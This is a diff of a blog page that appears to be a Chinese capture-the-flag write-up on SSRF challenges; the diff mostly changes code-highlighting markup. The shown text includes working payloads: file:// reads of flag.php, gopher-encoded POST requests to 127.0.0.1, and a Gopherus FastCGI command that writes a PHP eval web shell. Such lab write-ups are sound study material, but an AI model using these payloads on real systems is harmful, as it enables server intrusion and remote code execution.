@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -277,7 +285,7 @@
 <h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>尝试去读取一下Web目录下的flag.php吧        </p>
 <p>题目说是web目录，用file伪协议即可<br>payload：<code>url=file:///var/www/html/flag.php</code><br>web目录要记住          </p>
 <h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>看wp说能扫出<code>index.php</code>和<code>flag.php</code>的，但我没扫出来<br>直接访问吧<br><code>/flag.php</code>——-&gt;Just View From 127.0.0.1<br>那么<code>?url=127.0.0.1/flag.php</code><img src="https://sc03.alicdn.com/kf/U16e6dcbec9894950bdd8eadca49482ecL.jpg" srcset="/img/loading.gif" alt="505.png"><br>可以用file协议读取<code>flag.php</code>        </p>
-<div class="hljs"><pre><code>&lt;?php
+<pre><code>&lt;?php
 
 error_reporting(0);
 
@@ -293,21 +301,21 @@ if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &
     echo $flag;
     exit;
 &#125;
-?&gt;</code></pre></div>
+?&gt;</code></pre>
 <p>没有提交按钮，可以用gopher协议构造post请求       </p>
-<div class="hljs"><pre><code>POST /flag.php HTTP/1.1
+<pre><code>POST /flag.php HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 36
 
-key=308353d55f15e345a78047c613994fcb         </code></pre></div>
+key=308353d55f15e345a78047c613994fcb         </code></pre>
 <p>将其进行url编码，<br>然后加上<code>gopher://127.0.0.1:80/_</code><br>再次url编码<br>提交得到flag<br>payload：<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p>
 <h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>这个和上面那个差不多，也要用gopher协议<br>访问flag.php后有上传文件，但没提交按钮<br>可以自己构造一个<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>提交抓包<br>Host改为<code>127.0.0.1</code><br>过一下上面的编码流程<br>提交       </p>
 <h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助   </p>
 <p>这次可以使用<code>Gopherus</code>工具生成攻击fastcgi的payload     </p>
-<div class="hljs"><pre><code>python gopherus.py --exploit fastcgi
+<pre><code>python gopherus.py --exploit fastcgi
 /var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
-echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre></div>
+echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre>
 <p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/gopherus">gopher</a><br><img src="https://sc04.alicdn.com/kf/Ub52af498907e44fcb82b438d02f79f38P.jpg" srcset="/img/loading.gif" alt="507.png"><br>因为要以GET传入，所以要再进行一次url编码<br>提交后蚁剑连接即可<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">P神的fsatcgi分析</a>        </p>
 <h3 id="Redia协议"><a href="#Redia协议" class="headerlink" title="Redia协议"></a>Redia协议</h3><p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!     </p>
 <p>Redia也可以用gopherus直接生成payload<br><img src="https://sc01.alicdn.com/kf/U59fa33c2723c4f3899da3f7205a6a573R.jpg" srcset="/img/loading.gif" alt="508.png"><br>但这次需要将得到的payload进行两次url编码，不知道为什么，不该是一次么？？        </p>
@@ -476,6 +484,8 @@ echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shel
 
 
 
+  
+    
   
 
 
